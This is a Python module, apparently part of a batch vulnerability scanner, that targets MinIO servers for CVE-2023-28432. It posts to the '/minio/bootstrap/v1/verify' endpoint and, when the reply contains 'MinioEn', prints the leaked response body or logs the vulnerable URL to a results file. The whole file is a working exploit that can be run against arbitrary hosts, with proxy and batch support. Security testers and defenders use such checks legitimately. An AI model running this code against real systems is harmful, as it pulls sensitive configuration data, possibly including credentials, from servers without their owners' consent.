# ! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

class Cve_2023_28432:
	def main(self, target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		verify = target["ssl"]
		header = target["header"]
		proxy = target["proxy"]
		timeout = int(target["timeout"])
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

		if not self.batch:
			OutPrintInfo('Minio', '开始检测CVE-2023-28432敏感信息泄漏')
		head = {
			'Host': url.split("://")[-1],
			'User-Agent': header,
			'Content-Type': 'application/x-www-form-urlencoded'
		}
		res_url = url + '/minio/bootstrap/v1/verify'
		data = ""
		try:
			response = requests.post(res_url, headers=head,data=data, allow_redirects=False,verify=verify, proxies=self.proxy,timeout=timeout)
			if 'MinioEn' in response.text:
				OutPrintInfoSuc('Minio',f'存在CVE-2023-28432敏感信息泄漏 {res_url}')
				if not self.batch:
					OutPrintInfo('Minio',f'响应体: \n{response.text}')
				else:
					with open("./result/minio_2023_28432.txt","a") as w:
						w.write(f"{res_url}\n")

			else:
				if not self.batch:
					OutPrintInfo('Minio',f'{url}未发现漏洞...')
		except Exception as e:
			if not self.batch:
				OutPrintInfo('Minio', f'{url}请求出错...')

		if not self.batch:
			OutPrintInfo('Minio','CVE-2023-28432敏感信息泄漏检测结束')